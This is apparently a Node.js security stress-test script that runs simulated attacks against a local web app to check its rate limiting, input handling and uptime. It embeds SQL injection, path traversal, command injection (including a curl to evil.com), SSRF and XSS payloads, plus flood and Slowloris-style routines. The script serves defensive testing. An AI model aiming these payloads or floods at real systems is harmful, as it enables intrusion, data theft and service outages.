'use strict';
// ============================================================
// 暴力测试（Docker 内网压测 + 攻击模拟）
// ------------------------------------------------------------
// 目的：不是「证明能通」，而是「证明打不坏、打不穿」。
//   1. 限流：高强度请求必须被 429 挡住，且不拖垮服务
//   2. 注入：SQL/路径穿越/命令注入/SSRF 载荷不能造成 500 或数据泄露
//   3. XSS：恶意内容入库后必须被转义
//   4. 资源耗尽：超大 body / 超长 URL / 海量 header 不能把进程打挂
//   5. 并发洪泛：多路并发后服务必须仍然健康
//   6. 崩溃恢复：每轮攻击后检查 /api/health 与响应时间
//
// 用法：
//   TEST_URL=http://127.0.0.1:35545 node 测试/test-bruteforce.js
//   BRUTE_LEVEL=light|normal|heavy   控制强度（默认 normal）
//
// 安全说明：仅对本机/自有环境使用。默认强度足够验证防护，
// 不会造成长时间的服务不可用。
// ============================================================
const http = require('http');

const BASE = process.env.TEST_URL || 'http://127.0.0.1:35545';
const LEVEL = process.env.BRUTE_LEVEL || 'normal';
const U = new URL(BASE);

// 强度档位：控制并发与总量，避免把自己的开发机也拖垮
const PROFILES = {
  light: { concurrency: 10, rounds: 30, burst: 50 },
  normal: { concurrency: 25, rounds: 60, burst: 150 },
  heavy: { concurrency: 60, rounds: 150, burst: 400 }
};
const P = PROFILES[LEVEL] || PROFILES.normal;

let pass = 0, fail = 0, warn = 0;
const failures = [];
const slowest = { ms: 0, path: '' };

function ok(m) { pass++; console.log('  ✓ ' + m); }
function bad(m, e) { fail++; failures.push({ m, e }); console.log('  ✗ ' + m + ' — ' + e); }
function notice(m) { warn++; console.log('  ! ' + m); }
function assert(c, m) { if (!c) throw new Error(m); }

// ---------------- HTTP 基础能力 ----------------
let activeSockets = 0;
let maxActiveSockets = 0;

function rawRequest(method, path, opts = {}) {
  return new Promise((resolve) => {
    const started = Date.now();
    const headers = Object.assign({}, opts.headers || {});
    let body = opts.body;
    if (body) headers['Content-Length'] = Buffer.byteLength(body);

    const req = http.request({
      hostname: U.hostname,
      port: U.port || 80,
      path,
      method,
      headers,
      timeout: opts.timeout || 15000,
      agent: false
    }, (res) => {
      let data = '';
      res.on('data', c => { data += c; });
      res.on('end', () => {
        const ms = Date.now() - started;
        if (ms > slowest.ms) { slowest.ms = ms; slowest.path = path; }
        resolve({ status: res.statusCode, headers: res.headers, body: data, ms });
      });
    });

    activeSockets++;
    if (activeSockets > maxActiveSockets) maxActiveSockets = activeSockets;

    req.on('timeout', () => { req.destroy(); activeSockets--; resolve({ status: 0, error: 'timeout', ms: Date.now() - started, body: '', headers: {} }); });
    req.on('error', (e) => { activeSockets--; resolve({ status: 0, error: e.message, ms: Date.now() - started, body: '', headers: {} }); });
    req.on('close', () => { activeSockets = Math.max(0, activeSockets - 1); });

    if (body) req.write(body);
    req.end();
  });
}

// 并发池：限制同时进行的请求数
async function pool(tasks, limit) {
  const results = [];
  let idx = 0;
  async function worker() {
    while (idx < tasks.length) {
      const i = idx++;
      results[i] = await tasks[i]();
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
  return results;
}

// 健康检查：判断服务是否还活着
async function health() {
  const r = await rawRequest('GET', '/api/health', { timeout: 8000 });
  return r.status === 200 && /"status":"ok"/.test(r.body);
}

// 拿一个带 CSRF 的会话
function makeClient() {
  const jar = new Map();
  function cookieHeader() { return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; '); }
  function store(res) {
    for (const c of (res.headers['set-cookie'] || [])) {
      const [p] = c.split(';'); const i = p.indexOf('=');
      if (i > 0) jar.set(p.slice(0, i).trim(), p.slice(i + 1).trim());
    }
  }
  async function call(method, path, opts = {}) {
    const r = await rawRequest(method, path, Object.assign({}, opts, {
      headers: Object.assign({ Cookie: cookieHeader() }, opts.headers || {})
    }));
    store(r);
    return r;
  }
  return {
    jar,
    get: (p, o) => call('GET', p, o),
    post: (p, o) => call('POST', p, o),
    csrf: () => jar.get('csrf_token') || '',
    async prime() { await call('GET', '/login'); return this.csrf(); }
  };
}

// ============================================================
// 1) 限流暴力验证
// ============================================================
async function testRateLimit() {
  console.log('\n[1] 限流暴力验证');
  console.log(`    强度: ${LEVEL} (并发 ${P.concurrency}, 轮次 ${P.rounds})`);

  // 验证码接口：3 次/分钟/IP
  try {
    const c = makeClient();
    await c.prime();
    const token = c.csrf();
    const body = JSON.stringify({ email: 'brute@example.invalid' });

    const tasks = Array.from({ length: 30 }, () => () =>
      c.post('/forgot-password/request', {
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
        body
      })
    );
    const rs = await pool(tasks, 10);
    const codes = rs.map(r => r.status);
    const tooMany = codes.filter(s => s === 429).length;
    const serverErr = codes.filter(s => s >= 500).length;

    assert(tooMany > 0, '30 次请求完全没触发 429（限流没生效？）');
    assert(serverErr === 0, `出现 ${serverErr} 个 5xx`);
    ok(`验证码限流生效：${tooMany}/30 被 429 拦截，无 5xx`);
  } catch (e) { bad('验证码限流', e.message); }

  // 留言板：10 次/10 分钟/IP
  try {
    const c = makeClient();
    await c.prime();
    const token = c.csrf();
    const form = new URLSearchParams({ content: 'brute-guestbook-test', _csrf: token }).toString();

    const tasks = Array.from({ length: 30 }, () => () =>
      c.post('/messages/guestbook', {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: form
      })
    );
    const rs = await pool(tasks, 8);
    const tooMany = rs.filter(r => r.status === 429).length;
    const serverErr = rs.filter(r => r.status >= 500).length;
    assert(tooMany > 0, '留言板 30 次未触发限流');
    assert(serverErr === 0, `出现 ${serverErr} 个 5xx`);
    ok(`留言板限流生效：${tooMany}/30 被 429 拦截`);
  } catch (e) { bad('留言板限流', e.message); }

  // 限流不应影响其他路径（桶要隔离）
  try {
    const c = makeClient();
    await c.prime();
    const r = await c.get('/forum');
    assert(r.status === 200, '被限流后 /forum 返回 ' + r.status);
    ok('限流按路径隔离：验证码被打满后 /forum 仍正常');
  } catch (e) { bad('限流隔离', e.message); }
}

// ============================================================
// 2) 注入攻击
// ============================================================
async function testInjection() {
  console.log('\n[2] 注入攻击');

  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE forum_posts;--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(3)--",
    "admin'--",
    "' OR 1=1 LIMIT 1--",
    "\\'; DROP TABLE users;--",
    "%27%20OR%201%3D1--"
  ];

  // GET 参数注入
  try {
    const paths = [];
    for (const p of sqlPayloads) {
      paths.push('/forum?sort=' + encodeURIComponent(p));
      paths.push('/forum?category=' + encodeURIComponent(p));
      paths.push('/forum?page=' + encodeURIComponent(p));
      paths.push('/search?q=' + encodeURIComponent(p));
      paths.push('/videos?category=' + encodeURIComponent(p));
      paths.push('/secret/show?code=' + encodeURIComponent(p));
    }
    const rs = await pool(paths.map(p => () => rawRequest('GET', p)), 10);
    const serverErr = rs.filter(r => r.status >= 500);
    const leaked = rs.filter(r => /SQL syntax|mysql_fetch|SQLITE_ERROR|no such table|You have an error in your SQL/i.test(r.body));
    assert(serverErr.length === 0, `${serverErr.length} 个请求返回 5xx`);
    assert(leaked.length === 0, `${leaked.length} 个响应泄露了数据库错误`);
    ok(`GET 注入 ${paths.length} 个载荷：无 5xx、无 SQL 错误泄露`);
  } catch (e) { bad('GET 参数注入', e.message); }

  // POST body 注入
  try {
    const c = makeClient();
    await c.prime();
    const token = c.csrf();
    const tasks = sqlPayloads.map(p => () =>
      c.post('/messages/guestbook', {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ content: p, author_name: p, _csrf: token }).toString()
      })
    );
    const rs = await pool(tasks, 5);
    const serverErr = rs.filter(r => r.status >= 500);
    assert(serverErr.length === 0, `${serverErr.length} 个 5xx`);
    ok(`POST 注入 ${sqlPayloads.length} 个载荷：无 5xx`);
  } catch (e) { bad('POST 注入', e.message); }

  // 路径穿越
  try {
    const trav = [
      '../../../etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '/public/../../../../etc/passwd',
      '/uploads/../../../etc/passwd',
      '/public/..%252f..%252fetc%252fpasswd',
      '/.env',
      '/../.env',
      '/config/db.js',
      '/package.json'
    ];
    const rs = await pool(trav.map(p => () => rawRequest('GET', p)), 5);
    const leaked = rs.filter(r =>
      /root:x:0:0|MYSQL_PASSWORD|SESSION_SECRET|CASDOOR_CLIENT_SECRET/.test(r.body)
    );
    assert(leaked.length === 0, `${leaked.length} 个路径穿越请求读到了敏感文件`);
    ok(`路径穿越 ${trav.length} 个载荷：未读到敏感文件`);
  } catch (e) { bad('路径穿越', e.message); }

  // 命令注入
  try {
    const cmd = [
      ';cat /etc/passwd',
      '$(whoami)',
      '`id`',
      '|ls -la',
      '&&curl evil.com'
    ];
    const rs = await pool(cmd.map(p => () => rawRequest('GET', '/search?q=' + encodeURIComponent(p))), 5);
    const leaked = rs.filter(r => /root:x:0:0|uid=\d+\(/.test(r.body));
    assert(leaked.length === 0, '命令注入造成了命令执行');
    ok(`命令注入 ${cmd.length} 个载荷：无执行迹象`);
  } catch (e) { bad('命令注入', e.message); }

  // SSRF：视频外链不能是内网地址（只验证不会真的去请求内网）
  try {
    const ssrf = [
      'http://127.0.0.1:35555/api/health',
      'http://localhost:3306',
      'http://169.254.169.254/latest/meta-data/',
      'file:///etc/passwd'
    ];
    for (const p of ssrf) {
      const r = await rawRequest('GET', '/videos?category=' + encodeURIComponent(p));
      assert(r.status < 500, '返回 ' + r.status);
    }
    ok(`SSRF ${ssrf.length} 个载荷：接口未崩溃`);
  } catch (e) { bad('SSRF', e.message); }
}

// ============================================================
// 3) XSS 入库与转义
// ============================================================
async function testXSS() {
  console.log('\n[3] XSS 载荷');

  const xss = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '"><svg/onload=alert(1)>'
  ];

  try {
    const c = makeClient();
    await c.prime();
    const token = c.csrf();

    // 提交 XSS 载荷到留言板
    const tasks = xss.slice(0, 5).map(p => () =>
      c.post('/messages/guestbook', {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ content: p, author_name: p, _csrf: token }).toString()
      })
    );
    const rs = await pool(tasks, 3);
    const serverErr = rs.filter(r => r.status >= 500);
    assert(serverErr.length === 0, `${serverErr.length} 个 5xx`);

    // 检查渲染结果是否转义
    const page = await rawRequest('GET', '/messages/guestbook');
    const rawScript = /<script>\s*alert\(1\)\s*<\/script>/i.test(page.body);
    const rawImg = /<img\s+src=x\s+onerror=/i.test(page.body);
    const rawSvg = /<svg\s+onload=/i.test(page.body);
    assert(!rawScript, '页面存在未转义的 <script>');
    assert(!rawImg, '页面存在未转义的 onerror 属性');
    assert(!rawSvg, '页面存在未转义的 svg onload');
    ok(`XSS ${xss.length} 个载荷：入库后渲染均被转义`);
  } catch (e) { bad('XSS 转义', e.message); }

  // 管理端弹窗内容（曾经用 innerHTML 的地方）
  try {
    const r = await rawRequest('GET', '/api/popups?page=home');
    assert(r.status < 500, '弹窗接口返回 ' + r.status);
    ok('弹窗接口正常（正文已改 textContent 渲染）');
  } catch (e) { bad('弹窗接口', e.message); }
}

// ============================================================
// 4) 资源耗尽
// ============================================================
async function testResourceExhaustion() {
  console.log('\n[4] 资源耗尽');

  // 超大 body
  try {
    const big = 'x'.repeat(5 * 1024 * 1024); // 5MB
    const c = makeClient();
    await c.prime();
    const r = await c.post('/messages/guestbook', {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'content=' + big,
      timeout: 20000
    });
    assert(r.status !== 0, '请求超时/连接被重置');
    assert(r.status < 500, '返回 ' + r.status + '（应被拒绝而非 500）');
    ok(`5MB body：被拒绝（${r.status}），服务未崩`);
  } catch (e) { bad('超大 body', e.message); }

  // 超长 URL
  try {
    const long = '/forum?tag=' + 'A'.repeat(8000);
    const r = await rawRequest('GET', long, { timeout: 15000 });
    assert(r.status !== 0, '连接失败');
    assert(r.status < 500, '返回 ' + r.status);
    ok(`8000 字符 URL：${r.status}（未 5xx）`);
  } catch (e) { bad('超长 URL', e.message); }

  // 海量 header
  try {
    const headers = {};
    for (let i = 0; i < 80; i++) headers['X-Custom-' + i] = 'v'.repeat(200);
    const r = await rawRequest('GET', '/', { headers, timeout: 15000 });
    assert(r.status !== 0, '连接失败');
    ok(`80 个自定义 header：${r.status}`);
  } catch (e) { bad('海量 header', e.message); }

  // 畸形 JSON
  try {
    const bad = ['{', '{"a":', 'null', '[]', '"str"', '{"__proto__":{"x":1}}'];
    const c = makeClient();
    await c.prime();
    const token = c.csrf();
    const rs = await pool(bad.map(b => () =>
      c.post('/forum/comment/1', {
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': token },
        body: b
      })
    ), 3);
    const serverErr = rs.filter(r => r.status >= 500);
    assert(serverErr.length === 0, `${serverErr.length} 个 5xx`);
    ok(`畸形 JSON ${bad.length} 个：无 5xx（含 __proto__ 污染尝试）`);
  } catch (e) { bad('畸形 JSON', e.message); }

  // 空字节与非法 UTF-8
  try {
    const payloads = ['%00', '%00%00', '%ff%fe', '%c0%af', '%e0%80%af'];
    const rs = await pool(payloads.map(p => () => rawRequest('GET', '/search?q=' + p)), 3);
    const serverErr = rs.filter(r => r.status >= 500);
    assert(serverErr.length === 0, `${serverErr.length} 个 5xx`);
    ok(`空字节/非法 UTF-8 ${payloads.length} 个：无 5xx`);
  } catch (e) { bad('非法编码', e.message); }
}

// ============================================================
// 5) 并发洪泛
// ============================================================
async function testFlood() {
  console.log('\n[5] 并发洪泛');
  console.log(`    并发 ${P.concurrency} × ${P.burst} 请求`);

  try {
    const tasks = Array.from({ length: P.burst }, (_, i) => () => {
      // 混合路径，模拟真实流量而非单一打点
      const paths = ['/', '/forum', '/videos', '/search?q=test', '/api/health', '/login'];
      return rawRequest('GET', paths[i % paths.length], { timeout: 20000 });
    });
    const t0 = Date.now();
    const rs = await pool(tasks, P.concurrency);
    const dur = Date.now() - t0;

    const okCount = rs.filter(r => r.status === 200).length;
    const limited = rs.filter(r => r.status === 429).length;
    const serverErr = rs.filter(r => r.status >= 500).length;
    const networkErr = rs.filter(r => r.status === 0).length;

    const alive = await health();
    assert(alive, '洪泛后服务已不健康');
    assert(serverErr === 0, `${serverErr} 个 5xx`);
    ok(`洪泛完成：${okCount} 个 200 / ${limited} 个 429 / ${networkErr} 个连接失败，耗时 ${dur}ms，服务仍健康`);
    console.log(`     最大并发连接数: ${maxActiveSockets}`);

    if (networkErr > tasks.length * 0.3) {
      notice(`${networkErr} 个连接失败（超过 30%），可能存在连接上限瓶颈`);
    }
  } catch (e) { bad('并发洪泛', e.message); }
}

// ============================================================
// 6) 慢连接（Slowloris 简化版）
// ============================================================
async function testSlowConnections() {
  console.log('\n[6] 慢连接占用');

  try {
    const net = require('net');
    const sockets = [];
    const opened = await new Promise((resolve) => {
      let count = 0;
      for (let i = 0; i < 20; i++) {
        const s = net.connect(U.port || 80, U.hostname, () => {
          // 只发半个请求头，不结束
          s.write('GET / HTTP/1.1\r\nHost: ' + U.host + '\r\n');
          count++;
          if (count === 20) resolve(count);
        });
        s.on('error', () => {});
        sockets.push(s);
      }
      setTimeout(() => resolve(count), 5000);
    });

    // 保持连接期间，正常请求应当仍能完成
    await new Promise(r => setTimeout(r, 1500));
    const alive = await health();

    // 清理
    sockets.forEach(s => { try { s.destroy(); } catch (e) {} });

    assert(alive, '慢连接占用期间服务不健康');
    ok(`${opened} 个半开连接占用期间，/api/health 仍正常响应`);
  } catch (e) { bad('慢连接', e.message); }
}

// ============================================================
// 7) 崩溃恢复
// ============================================================
async function testRecovery() {
  console.log('\n[7] 崩溃恢复与响应时间');

  // 注意：上一轮洪泛已经把本机 IP 的页面限流桶（300/分钟）打满，
  // 紧接着用同一 IP 请求 /forum 会拿到 429 —— 那是限流在正常工作，
  // 不能当成「服务没恢复」。这里换一个源 IP 验证服务本身是否还能正常渲染。
  try {
    const t0 = Date.now();
    const r = await rawRequest('GET', '/forum', { headers: { 'X-Real-IP': '198.51.100.77' }, timeout: 10000 });
    const ms = Date.now() - t0;
    if (r.status === 429) {
      // 换 IP 仍被限说明限流键没按 IP 隔离，这才是真问题
      throw new Error('换源 IP 后仍被限流（限流键可能未按 IP 隔离）');
    }
    assert(r.status === 200, '/forum 返回 ' + r.status);
    assert(ms < 5000, `响应 ${ms}ms，过慢`);
    ok(`洪泛后 /forum 响应 ${ms}ms（新源 IP，服务已恢复）`);
  } catch (e) { bad('响应时间', e.message); }

  // 顺带确认被限的那个 IP 确实还在 429 窗口内（证明限流真的生效了）
  try {
    const r = await rawRequest('GET', '/forum', { timeout: 10000 });
    if (r.status === 429) {
      ok('本机 IP 仍在限流窗口内（429），符合预期');
    } else {
      notice('本机 IP 未被限流（可能窗口已过，或请求量不足）');
    }
  } catch (e) { notice('限流状态检查跳过: ' + e.message); }

  try {
    const alive = await health();
    assert(alive, '健康检查失败');
    ok('全部攻击结束后服务仍健康');
  } catch (e) { bad('最终健康检查', e.message); }

  try {
    // 静态资源必须仍可访问（CDN 缓存层不受页面限流影响）
    const r = await rawRequest('GET', '/public/js/main.js');
    assert(r.status === 200, '状态 ' + r.status);
    ok('静态资源仍可访问（不受页面限流影响）');
  } catch (e) { bad('静态资源', e.message); }

  // 检查应用日志是否有未捕获异常
  try {
    const { execSync } = require('child_process');
    let logs = '';
    try {
      logs = execSync('docker compose logs app --since 3m 2>&1', { encoding: 'utf8', timeout: 20000 });
    } catch (e) { logs = ''; }
    if (!logs) {
      notice('无法读取容器日志（非 Docker 环境或权限不足），跳过异常日志检查');
    } else {
      const uncaught = (logs.match(/未捕获的 (Promise )?异常/g) || []).length;
      const crashes = (logs.match(/EADDRINUSE|Cannot read propert|TypeError:|ReferenceError:/g) || []).length;
      assert(uncaught === 0, `日志中有 ${uncaught} 条未捕获异常`);
      assert(crashes === 0, `日志中有 ${crashes} 条运行时错误`);
      ok('应用日志无未捕获异常、无运行时错误');
    }
  } catch (e) { bad('异常日志', e.message); }
}

// ============================================================
// 主流程
// ============================================================
(async () => {
  console.log('\n============================================');
  console.log(' D5ST 暴力测试');
  console.log(' 目标:', BASE);
  console.log(' 强度:', LEVEL);
  console.log('============================================');

  if (!await health()) {
    console.error('\n目标不可达或已不健康，终止。');
    process.exit(2);
  }
  console.log(' 起始健康检查: OK\n');

  await testRateLimit();
  await testInjection();
  await testXSS();
  await testResourceExhaustion();
  await testFlood();
  await testSlowConnections();
  await testRecovery();

  console.log('\n============================================');
  console.log(` 通过 ${pass} · 失败 ${fail} · 提醒 ${warn}`);
  console.log(` 最慢请求: ${slowest.ms}ms (${slowest.path})`);
  console.log(` 峰值并发连接: ${maxActiveSockets}`);
  console.log('============================================');
  if (failures.length) {
    console.log('\n失败明细:');
    failures.forEach((f, i) => console.log(`  ${i + 1}. ${f.m}\n     ${f.e}`));
  }
  console.log('');
  process.exit(fail > 0 ? 1 : 0);
})().catch(e => { console.error('测试框架异常:', e); process.exit(2); });
